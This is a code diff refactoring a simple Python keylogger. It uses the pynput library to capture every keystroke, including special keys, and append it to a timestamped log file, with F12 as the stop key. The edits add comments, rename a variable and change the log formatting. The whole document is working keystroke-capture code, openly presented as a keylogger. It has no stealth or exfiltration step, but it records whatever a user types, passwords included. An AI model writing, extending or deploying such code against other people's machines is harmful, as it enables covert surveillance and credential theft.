@@ -1,29 +1,38 @@
-# Simple keylogger
+"""
+Simple keylogger
+Tracks keystrokes and saves it into a file dated to when the program started
+"""
 
 import os
 import sys
 import time
 from pynput import keyboard
 
+# Creating file to store keys
 if not os.path.exists("logs"):
     os.makedirs("logs")
-date = time.strftime("log-%Y-%m-%d_%H-%M-%S")
+DATE = time.strftime("log-%Y-%m-%d_%H-%M-%S")
 
 # Given a key, writes it to a file
 def on_key_press(key):
+    # Log key
     try:
-        file = open("logs/" + date + ".txt", "a")
-        file.write(key.char + "\n")
+        # Text Key
+        file = open("logs/" + DATE + ".txt", "a")
+        file.write(key.char)
         file.close()
     except AttributeError:
-        file = open("logs/" + date + ".txt", "a")
-        file.write("{0}\n".format(key))
+        # Adjustment Key
+        file = open("logs/" + DATE + ".txt", "a")
+        file.write("[{0}]".format(key))
         file.close()
     except TypeError:
-        file = open("logs/" + date + ".txt", "a")
-        file.write("Custom Key: {0}\n".format(key))
+        # Custom Key
+        file = open("logs/" + DATE + ".txt", "a")
+        file.write("[Custom: {0}]".format(key))
         file.close()
 
+    # Stop keylogger
     if key == keyboard.Key.f12:
         sys.exit()
 
